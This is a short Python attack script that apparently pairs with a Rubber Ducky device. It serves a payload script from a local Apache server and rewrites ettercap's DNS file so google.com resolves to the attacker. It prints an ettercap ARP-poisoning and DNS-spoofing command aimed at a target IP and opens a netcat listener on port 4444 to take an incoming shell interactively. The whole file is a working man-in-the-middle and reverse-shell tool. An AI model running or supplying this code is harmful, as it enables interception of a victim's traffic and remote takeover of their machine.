import nclib, os, sys, subprocess
# Takes target IP as 2nd argument

# Check if localhost has the script file for curling by the rubberducky
if("inactive (dead)" not in os.popen("systemctl status apache2").read()):
    print("Apache is running")
    scriptfile=os.popen("curl localhost/script").read()
    with open("samplescript.txt","r") as f:
        if (scriptfile==f.read()):
            print("Script on apache is good to go")
        else: 
            print("Script on apache is NOT good to go - overwriting now")
            os.system("mv scriptfile /var/www/html/script -f")
else:
    print("Start Apache with systemctl and try again")
    quit()
    
# Updating the ettercap dns file 
myip=os.popen("hostname -I").read()
os.system(f'sudo cp /etc/ettercap/etter.dns /etc/etter.dns.old && echo "google.com 	A	 {myip}\n*.google.com 	A	 {myip}\ngoogle.com 	PTR	 {myip}" | sudo tee /etc/ettercap/etter.dns')
print("etter.dns is good to go")

# Run ettercap
ipoutput=os.popen("traceroute 8.8.8.8").read()

# Getting the IP of the router for arp poisoning purposes
routerip=ipoutput.split("\n")[1].split("(")[1].split(")")[0]
print(routerip)
try:
    print("Open a new terminal and paste this in:\n")
    print(f'sudo ettercap -M arp:remote -P dns_spoof -q -T /{routerip}// /{sys.argv[1]}// -m log.txt')
    input("\nHit enter to continue")
except:
    print("Please provide a target IP")
    
# Listen for connections
print("Listening for connections on port 4444")
nc = nclib.Netcat(listen=4444, verbose=True)
if(nc.peer):
    print(f'Connection recieved from {nc.peer[0]}')
    nc.interact()